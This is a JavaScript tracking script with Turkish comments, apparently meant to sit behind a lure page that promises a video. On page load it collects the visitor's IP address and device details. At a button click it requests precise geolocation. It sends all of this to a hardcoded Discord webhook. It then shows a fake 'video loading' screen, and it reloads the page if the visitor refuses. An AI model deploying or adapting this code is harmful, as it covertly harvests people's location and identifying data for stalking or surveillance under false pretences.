// ============================================
// CYBERX BUTONLA KONUM İZNİ - ÇALIŞIR VERSİYON
// ============================================

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1515100986648166723/nV48g4sriYiCN0SVpv0eko1dsoiLYi_4njTRKI-Pn9gZr3PsCa6kQFEUgSo6NwChIM07';

async function sendData(data) {
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: data })
        });
    } catch(e) {}
}

async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch(e) { return 'IP alınamadı'; }
}

function getDeviceInfo() {
    const ua = navigator.userAgent;
    let device = 'Bilinmiyor';
    if (ua.includes('Android')) device = 'Android';
    else if (ua.includes('iPhone')) device = 'iPhone';
    else if (ua.includes('Windows')) device = 'Windows PC';
    else if (ua.includes('Mac')) device = 'Mac';
    return {
        cihaz: device,
        isletim: ua.includes('Android') ? 'Android' : (ua.includes('iOS') ? 'iOS' : 'Diğer'),
        tarayici: ua.includes('Chrome') ? 'Chrome' : (ua.includes('Firefox') ? 'Firefox' : 'Safari/Diğer'),
        ekran: `${screen.width}x${screen.height}`,
        dil: navigator.language
    };
}

let ipBilgisi = null;
let cihazBilgisi = null;

// Sayfa açılınca IP ve cihaz bilgilerini al (konum isteme yok)
async function init() {
    ipBilgisi = await getIP();
    cihazBilgisi = getDeviceInfo();
    sendData(`🆕 Sayfa açıldı | IP: ${ipBilgisi} | Cihaz: ${cihazBilgisi.cihaz} | ${cihazBilgisi.tarayici}`);
}

// Butona tıklayınca çağrılacak fonksiyon (konum isteği burada)
function askLocationManually() {
    if (!navigator.geolocation) {
        alert("Tarayıcın konum desteklemiyor.");
        return;
    }
    
    // Hemen konum iste (butona tıklandığı için pop-up çıkar)
    navigator.geolocation.getCurrentPosition(
        (pos) => {
            const konumMesaji = `✅ KONUM ALINDI!
📍 Enlem: ${pos.coords.latitude}
📍 Boylam: ${pos.coords.longitude}
🎯 Doğruluk: ${pos.coords.accuracy}m
🌐 IP: ${ipBilgisi}
📱 Cihaz: ${cihazBilgisi.cihaz} | ${cihazBilgisi.tarayici}`;
            sendData(konumMesaji);
            // Başarılı olunca sayfayı değiştir
            document.body.innerHTML = '<div style="text-align:center; margin-top:50px;"><h1>🎉 Video yükleniyor! 🎉</h1><img src="https://cataas.com/cat/says/danke" width="100%"><p>Danke fürs Konum!</p></div>';
        },
        (error) => {
            let hata = '';
            if (error.code === 1) hata = 'Kullanıcı izin vermedi';
            else if (error.code === 2) hata = 'Konum bulunamadı';
            else hata = 'Zaman aşımı';
            sendData(`❌ Konum hatası: ${hata} | IP: ${ipBilgisi}`);
            alert("Konum izni vermelisin! Tekrar dene.");
            // Modal'ı tekrar açabiliriz ama basitçe sayfayı yenilemek de olur
            location.reload();
        },
        { enableHighAccuracy: true, timeout: 10000 }
    );
}

// Sayfa açılınca IP topla
init();
